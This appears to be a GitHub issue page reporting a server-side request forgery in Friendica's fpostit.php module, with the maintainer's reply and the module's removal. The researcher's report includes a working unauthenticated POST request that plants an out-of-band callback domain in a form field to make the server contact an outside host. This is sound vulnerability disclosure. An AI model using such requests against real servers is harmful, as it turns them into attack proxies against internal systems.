
[Skip to content](#start-of-content)

## Navigation Menu

Toggle navigation

[Sign in](/login?return_to=https%3A%2F%2Fgithub.com%2Ffriendica%2Ffriendica%2Fissues%2F13877)

* Product

  + [GitHub Copilot
    Write better code with AI](https://github.com/features/copilot)
  + [Security
    Find and fix vulnerabilities](https://github.com/features/security)
  + [Actions
    Automate any workflow](https://github.com/features/actions)
  + [Codespaces
    Instant dev environments](https://github.com/features/codespaces)
  + [Issues
    Plan and track work](https://github.com/features/issues)
  + [Code Review
    Manage code changes](https://github.com/features/code-review)
  + [Discussions
    Collaborate outside of code](https://github.com/features/discussions)
  + [Code Search
    Find more, search less](https://github.com/features/code-search)

  Explore
  + [All features](https://github.com/features)
  + [Documentation](https://docs.github.com)
  + [GitHub Skills](https://skills.github.com)
  + [Blog](https://github.blog)
* Solutions

  By company size
  + [Enterprises](https://github.com/enterprise)
  + [Small and medium teams](https://github.com/team)
  + [Startups](https://github.com/enterprise/startups)
  By use case
  + [DevSecOps](/solutions/use-case/devsecops)
  + [DevOps](/solutions/use-case/devops)
  + [CI/CD](/solutions/use-case/ci-cd)
  + [View all use cases](/solutions/use-case)

  By industry
  + [Healthcare](/solutions/industry/healthcare)
  + [Financial services](/solutions/industry/financial-services)
  + [Manufacturing](/solutions/industry/manufacturing)
  + [Government](/solutions/industry/government)
  + [View all industries](/solutions/industry)

  [View all solutions](/solutions)
* Resources

  Topics
  + [AI](/resources/articles/ai)
  + [DevOps](/resources/articles/devops)
  + [Security](/resources/articles/security)
  + [Software Development](/resources/articles/software-development)
  + [View all](/resources/articles)

  Explore
  + [Learning Pathways](https://resources.github.com/learn/pathways)
  + [White papers, Ebooks, Webinars](https://resources.github.com)
  + [Customer Stories](https://github.com/customer-stories)
  + [Partners](https://partner.github.com)
  + [Executive Insights](https://github.com/solutions/executive-insights)
* Open Source

  + [GitHub Sponsors
    Fund open source developers](/sponsors)
  + [The ReadME Project
    GitHub community articles](https://github.com/readme)
  Repositories
  + [Topics](https://github.com/topics)
  + [Trending](https://github.com/trending)
  + [Collections](https://github.com/collections)
* Enterprise

  + [Enterprise platform
    AI-powered developer platform](/enterprise)
  Available add-ons
  + [Advanced Security
    Enterprise-grade security features](https://github.com/enterprise/advanced-security)
  + [GitHub Copilot
    Enterprise-grade AI features](/features/copilot#enterprise)
  + [Premium Support
    Enterprise-grade 24/7 support](/premium-support)
* [Pricing](https://github.com/pricing)

Search or jump to...

# Search code, repositories, users, issues, pull requests...

Search

Clear

[Search syntax tips](https://docs.github.com/search-github/github-code-search/understanding-github-code-search-syntax)

# Provide feedback

We read every piece of feedback, and take your input very seriously.

Include my email address so I can be contacted

  Cancel

 Submit feedback

# Saved searches

## Use saved searches to filter your results more quickly

Name

Query

To see all available qualifiers, see our [documentation](https://docs.github.com/search-github/github-code-search/understanding-github-code-search-syntax).

  Cancel

 Create saved search

[Sign in](/login?return_to=https%3A%2F%2Fgithub.com%2Ffriendica%2Ffriendica%2Fissues%2F13877)

[Sign up](/signup?ref_cta=Sign+up&ref_loc=header+logged+out&ref_page=%2F%3Cuser-name%3E%2F%3Crepo-name%3E%2Fvoltron%2Fissues_fragments%2Fissue_layout&source=header-repo&source_repo=friendica%2Ffriendica)
Reseting focus

You signed in with another tab or window. Reload to refresh your session.
You signed out in another tab or window. Reload to refresh your session.
You switched accounts on another tab or window. Reload to refresh your session.

Dismiss alert

{{ message }}

[friendica](/friendica)
/
**[friendica](/friendica/friendica)**
Public

forked from [duthied/Free-Friendika](/duthied/Free-Friendika)

* [Notifications](/login?return_to=%2Ffriendica%2Ffriendica) You must be signed in to change notification settings
* [Fork
  342](/login?return_to=%2Ffriendica%2Ffriendica)
* [Star
   1.5k](/login?return_to=%2Ffriendica%2Ffriendica)

* [Code](/friendica/friendica)
* [Issues
  1.2k](/friendica/friendica/issues)
* [Pull requests
  11](/friendica/friendica/pulls)
* [Actions](/friendica/friendica/actions)
* [Wiki](/friendica/friendica/wiki)
* [Security](/friendica/friendica/security)
* [Insights](/friendica/friendica/pulse)

Additional navigation options

* [Code](/friendica/friendica)
* [Issues](/friendica/friendica/issues)
* [Pull requests](/friendica/friendica/pulls)
* [Actions](/friendica/friendica/actions)
* [Wiki](/friendica/friendica/wiki)
* [Security](/friendica/friendica/security)
* [Insights](/friendica/friendica/pulse)

New issue

**Have a question about this project?** Sign up for a free GitHub account to open an issue and contact its maintainers and the community.

 [Sign up for GitHub](/signup?return_to=%2Ffriendica%2Ffriendica%2Fissues%2Fnew%2Fchoose)

By clicking “Sign up for GitHub”, you agree to our [terms of service](https://docs.github.com/terms) and
[privacy statement](https://docs.github.com/privacy). We’ll occasionally send you account related emails.

Already on GitHub?
[Sign in](/login?return_to=%2Ffriendica%2Ffriendica%2Fissues%2Fnew%2Fchoose)
to your account

[Jump to bottom](#issue-comment-box)

# SSRF in fpostit.php #13877

Closed

[snajafov](/snajafov) opened this issue
Feb 8, 2024
· 4 comments
 · Fixed by [#13879](https://github.com/friendica/friendica/pull/13879)

Closed

# [SSRF in fpostit.php](#top) #13877

[snajafov](/snajafov) opened this issue
Feb 8, 2024
· 4 comments
 · Fixed by [#13879](https://github.com/friendica/friendica/pull/13879)

Assignees
[![@MrPetovan](https://avatars.githubusercontent.com/u/925415?s=40&v=4)](/MrPetovan)

Labels
[Bug](/friendica/friendica/labels/Bug)
[Junior Jobs](/friendica/friendica/labels/Junior%20Jobs)
These are issues we think are good for starting to work with the Friendica code base
[Privacy](/friendica/friendica/labels/Privacy)
Communication privacy related issues
[Security](/friendica/friendica/labels/Security)

Milestone
[2024.03](/friendica/friendica/milestone/35 "2024.03")

## Comments

[![@snajafov](https://avatars.githubusercontent.com/u/34606030?s=80&u=8989cab0ad340af80bdd2c6d6ec341e1e7f498dd&v=4)](/snajafov)

Copy link

### **[snajafov](/snajafov)** commented [Feb 8, 2024](#issue-2126093636)

| Hello Friendica Team! Issue detail I found a vulnerability issue while testing Friendica locally. The vulnerability lies in [fpostit.php](https://github.com/friendica/friendica/blob/stable/mods/fpostit/fpostit.php) It is possible to induce the application to perform server-side DNS lookups of arbitrary domain names and HTTP request. Bug Description The ability to send requests to other systems can allow the vulnerable server to be used as an attack proxy. By submitting suitable payloads, an attacker can cause the application server to attack other systems that it can interact with. This may include public third-party systems, internal systems within the same organization, or services available on the local loopback adapter of the application server itself. Depending on the network architecture, this may expose highly vulnerable internal services that are not otherwise accessible to external attackers. Steps to ReproduceThe request ``` POST /mods/fpostit/fpostit.php HTTP/1.1 Host: localhost User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:122.0) Gecko/20100101 Firefox/122.0 Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8 Accept-Language: en-US,en;q=0.5 Accept-Encoding: gzip, deflate, br Content-Type: application/x-www-form-urlencoded Content-Length: 124 Origin: http://localhost Connection: close Referer: http://localhost/mods/fpostit/fpostit.php  friendica_acct_name=abc%40zhkhlwppnozxttrzmk7ct6rix930rrlfa.oastify.com&friendica_password=abc&content=test&submit=PostIt%21  ``` The response ``` HTTP/1.1 200 OK Date: Thu, 08 Feb 2024 20:38:53 GMT Server: Apache/2.4.56 (Debian) X-Powered-By: PHP/8.1.27 Set-Cookie: username=abc%40zhkhlwppnozxttrzmk7ct6rix930rrlfa.oastify.com; expires=Wed, 04-Dec-2024 20:38:53 GMT; Max-Age=25920000 Set-Cookie: password=abc; expires=Wed, 04-Dec-2024 20:38:53 GMT; Max-Age=25920000 Vary: Accept-Encoding Content-Length: 553 Connection: close Content-Type: text/html; charset=UTF-8  <html> <head> 	<style> 		body { 			font-family: arial, Helvetica,sans-serif; 			margin: 0px; 		} 		.wrap1 { 			padding: 2px 5px; 			background-color: #729FCF; 			margin-bottom: 10px; 		} 		.wrap2 { 			margin-left: 10px; 			font-size: 12px; 		} 		.logo { 			margin-left: 3px; 			margin-right: 5px; 			float: left; 		} 		h2 { 			color: #ffffff; 		} 		.error { 			background-color: #FFFF66; 			font-size: 12px; 			margin-left: 10px; 		} 	</style> </head>  <body> <script language="javascript" type="text/javascript">window.close();</script> </body> </html>  ``` The DNS and HTTP request received [image](https://private-user-images.githubusercontent.com/34606030/303486433-7671f08c-fad1-4ce8-bd03-feab15e40953.png?jwt=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJnaXRodWIuY29tIiwiYXVkIjoicmF3LmdpdGh1YnVzZXJjb250ZW50LmNvbSIsImtleSI6ImtleTUiLCJleHAiOjE3MzY1Njg4MjksIm5iZiI6MTczNjU2ODUyOSwicGF0aCI6Ii8zNDYwNjAzMC8zMDM0ODY0MzMtNzY3MWYwOGMtZmFkMS00Y2U4LWJkMDMtZmVhYjE1ZTQwOTUzLnBuZz9YLUFtei1BbGdvcml0aG09QVdTNC1ITUFDLVNIQTI1NiZYLUFtei1DcmVkZW50aWFsPUFLSUFWQ09EWUxTQTUzUFFLNFpBJTJGMjAyNTAxMTElMkZ1cy1lYXN0LTElMkZzMyUyRmF3czRfcmVxdWVzdCZYLUFtei1EYXRlPTIwMjUwMTExVDA0MDg0OVomWC1BbXotRXhwaXJlcz0zMDAmWC1BbXotU2lnbmF0dXJlPTJmNmIzMTA0MmY0NzBkZDZhMDY2Njk4Nzg1ZWIwNTk0MGJjZDVjNmE5ODcwOWU5MjJhYmE0OTA1Mzk1Y2ViNjEmWC1BbXotU2lnbmVkSGVhZGVycz1ob3N0In0.AKUTTLihl--zAr285IprQRbSJsfS2Tr1kSGRGnuoBIA) More details To make this request one doesn't need to be authenticated. Issue remediation You should review the purpose and intended use of the relevant application functionality, and determine whether the ability to trigger arbitrary external service interactions is intended behavior. If so, you should be aware of the types of attacks that can be performed via this behavior and take appropriate measures. These measures might include blocking network access from the application server to other internal systems, and hardening the application server itself to remove any services available on the local loopback adapter. If the ability to trigger arbitrary external service interactions is not intended behavior, then you should implement a whitelist of permitted services and hosts, and block any interactions that do not appear on this whitelist. References [External service interaction (DNS)](https://portswigger.net/kb/issues/00300200_external-service-interaction-dns) [CWE-918: Server-Side Request Forgery (SSRF)](https://cwe.mitre.org/data/definitions/918.html) [CWE-406: Insufficient Control of Network Message Volume (Network Amplification)](https://cwe.mitre.org/data/definitions/406.html) Platform Info This is Friendica, version 2023.12 that is running at the web location <http://localhost>. The database version is 1542/1542, the post update version is 1507/1507.  **Apache version:** Apache/2.4.56 **PHP version:** PHP/8.1.27 **DB version:** 11.2.2-MariaDB |
| --- |
| The text was updated successfully, but these errors were encountered: |

All reactions

[![@snajafov](https://avatars.githubusercontent.com/u/34606030?s=40&u=8989cab0ad340af80bdd2c6d6ec341e1e7f498dd&v=4)](/snajafov)
[snajafov](/snajafov)
added
the
[Bug](/friendica/friendica/labels/Bug)
label
[Feb 8, 2024](#event-11751425008)

[![@MrPetovan](https://avatars.githubusercontent.com/u/925415?s=80&u=08a857bce3454c450582fab6488242638bf406a0&v=4)](/MrPetovan)

Copy link

Collaborator

### **[MrPetovan](/MrPetovan)** commented [Feb 8, 2024](#issuecomment-1935082338)

| Thank you for the report! |
| --- |

All reactions

Sorry, something went wrong.

[![@MrPetovan](https://avatars.githubusercontent.com/u/925415?s=40&u=08a857bce3454c450582fab6488242638bf406a0&v=4)](/MrPetovan)
[MrPetovan](/MrPetovan)
added
[Privacy](/friendica/friendica/labels/Privacy)
Communication privacy related issues
[Junior Jobs](/friendica/friendica/labels/Junior%20Jobs)
These are issues we think are good for starting to work with the Friendica code base
[Security](/friendica/friendica/labels/Security)
labels
[Feb 8, 2024](#event-11752261455)

[![@snajafov](https://avatars.githubusercontent.com/u/34606030?s=80&u=8989cab0ad340af80bdd2c6d6ec341e1e7f498dd&v=4)](/snajafov)

Copy link

Author

### **[snajafov](/snajafov)** commented [Feb 9, 2024](#issuecomment-1936399428)

| Thanks for the quick response! Do you mind if I request a CVE ID for the vulnerability? |
| --- |

All reactions

Sorry, something went wrong.

[![@MrPetovan](https://avatars.githubusercontent.com/u/925415?s=80&u=08a857bce3454c450582fab6488242638bf406a0&v=4)](/MrPetovan)

Copy link

Collaborator

### **[MrPetovan](/MrPetovan)** commented [Feb 10, 2024](#issuecomment-1936767631)

| Not at all, go ahead! |
| --- |

 ❤️
1
 snajafov reacted with heart emoji

All reactions

* ❤️
  1 reaction

Sorry, something went wrong.

[![@MrPetovan](https://avatars.githubusercontent.com/u/925415?s=40&u=08a857bce3454c450582fab6488242638bf406a0&v=4)](/MrPetovan)
[MrPetovan](/MrPetovan)
added this to the [2024.03](/friendica/friendica/milestone/35) milestone
[Feb 10, 2024](#event-11763484192)

[![@MrPetovan](https://avatars.githubusercontent.com/u/925415?s=40&u=08a857bce3454c450582fab6488242638bf406a0&v=4)](/MrPetovan)
[MrPetovan](/MrPetovan)
self-assigned this
[Feb 10, 2024](#event-11763484247)

[![@MrPetovan](https://avatars.githubusercontent.com/u/925415?s=80&u=08a857bce3454c450582fab6488242638bf406a0&v=4)](/MrPetovan)

Copy link

Collaborator

### **[MrPetovan](/MrPetovan)** commented [Feb 10, 2024](#issuecomment-1936790712)

| So, looking into it, this interaction seems unavoidable, as this is a node-agnostic bookmarklet. The bookmarklet is intended to perform a specific request against the domain part of the WebFinger address of the Friendica account provided in the form.  Since it's node-agnostic, we can't check for a local session before performing the external service request. The path of the target service is appended to the provided "domain", so there's a marginal risk to access arbitrary resources, but the DNS and HTTP requests are expected, even if the latter fails.  Maybe we should scrap this entirely. In the same folder there's another bookmarklet that is node-specific. It requires a little more setup but it wouldn't allow SSRF as it is an authenticated-only service. |
| --- |

All reactions

Sorry, something went wrong.

[![@MrPetovan](https://avatars.githubusercontent.com/u/925415?s=40&u=08a857bce3454c450582fab6488242638bf406a0&v=4)](/MrPetovan)
[MrPetovan](/MrPetovan)
mentioned this issue
[Feb 10, 2024](#ref-pullrequest-2128029989)

[Remove deprecated fpostit mod
#13879](/friendica/friendica/pull/13879)
 Merged

[![@annando](https://avatars.githubusercontent.com/u/844208?s=40&u=e6b28cb2c380d453152f409e5da897c4e93063a1&v=4)](/annando)
[annando](/annando)
closed this as [completed](/friendica/friendica/issues?q=is%3Aissue+is%3Aclosed+archived%3Afalse+reason%3Acompleted)
in
[#13879](/friendica/friendica/pull/13879)
[Feb 10, 2024](#event-11764158011)

[Sign up for free](/join?source=comment-repo)
**to join this conversation on GitHub**.
Already have an account?
[Sign in to comment](/login?return_to=https%3A%2F%2Fgithub.com%2Ffriendica%2Ffriendica%2Fissues%2F13877)

Assignees

[![@MrPetovan](https://avatars.githubusercontent.com/u/925415?s=40&v=4)](/MrPetovan) [MrPetovan](/MrPetovan)

Labels

[Bug](/friendica/friendica/labels/Bug)
[Junior Jobs](/friendica/friendica/labels/Junior%20Jobs)
These are issues we think are good for starting to work with the Friendica code base
[Privacy](/friendica/friendica/labels/Privacy)
Communication privacy related issues
[Security](/friendica/friendica/labels/Security)

Projects

None yet

Milestone

 [**2024.03**](/friendica/friendica/milestone/35 "2024.03")

Development

Successfully merging a pull request may close this issue.

 [Remove deprecated fpostit mod](/friendica/friendica/pull/13879)
 [MrPetovan/friendica](/MrPetovan/friendica)

2 participants

[![@MrPetovan](https://avatars.githubusercontent.com/u/925415?s=52&v=4)](/MrPetovan) [![@snajafov](https://avatars.githubusercontent.com/u/34606030?s=52&v=4)](/snajafov)

## Footer

© 2025 GitHub, Inc.

### Footer navigation

* [Terms](https://docs.github.com/site-policy/github-terms/github-terms-of-service)
* [Privacy](https://docs.github.com/site-policy/privacy-policies/github-privacy-statement)
* [Security](https://github.com/security)
* [Status](https://www.githubstatus.com/)
* [Docs](https://docs.github.com/)
* [Contact](https://support.github.com?tags=dotcom-footer)
* Manage cookies
* Do not share my personal information

You can’t perform that action at this time.

